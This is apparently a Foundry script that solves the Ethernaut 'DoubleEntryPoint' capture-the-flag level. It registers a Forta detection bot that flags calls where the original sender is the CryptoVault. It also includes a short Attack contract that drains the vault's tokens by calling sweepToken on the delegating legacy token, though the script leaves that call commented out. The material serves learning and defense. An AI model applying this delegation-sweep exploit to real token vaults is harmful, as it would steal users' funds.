// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/DoubleEntryPoint.sol";

contract DoubleEntryPointSolve is Script {
    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address cryptovault = det.cryptoVault();
        address player = det.player();
        address delegatedFrom = det.delegatedFrom(); // Legacy Token Address
        console.log("CryptoVault : ", cryptovault);
        console.log("Player : ", player);
        console.log("LGT : ", delegatedFrom);

        LegacyToken lgt = LegacyToken(delegatedFrom);
        CryptoVault cv = CryptoVault(cryptovault);

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));
        console.log("CryptoVault balance of LGT : ", lgt.balanceOf(cryptovault));

        console.log("Delegate of LGT : ", address(lgt.delegate()));
        console.log("DET : ", address(det));
        console.log("Both are same");

        Forta forta = det.forta();

        console.log("registering bot.........");

        DetectionBot bot = new DetectionBot();

        forta.setDetectionBot(address(bot));

        console.log("BOT ALERTS Before exploit : ",forta.botRaisedAlerts(address(bot)));

        console.log("Exploiting DET...........");

        // new Attack().exploit();  // reverts because bot detects the exploit

        console.log("CryptoVault balance of DET : ", det.balanceOf(cryptovault));

        console.log("BOT ALERTS After exploit : ",forta.botRaisedAlerts(address(bot)));

        vm.stopBroadcast();
    }
}

contract Attack{
    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    address public  cryptovault = det.cryptoVault();
    address public player = det.player();
    address public delegatedFrom = det.delegatedFrom(); // Legacy Token Address
    function exploit() public{
        CryptoVault cv = CryptoVault(cryptovault);

        cv.sweepToken(IERC20(delegatedFrom));

    }

}

contract DetectionBot{

    DoubleEntryPoint public det = DoubleEntryPoint(0xaf69EbD36B5465a0764Db0FE4dE0040780F6533C);
    address public  cryptovault = det.cryptoVault();

    function handleTransaction(address user, bytes calldata msgData) external {
        address origSender;

        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender ==cryptovault ){
            Forta(msg.sender).raiseAlert(user); // raise alert of Forta contract
        }
    }
}
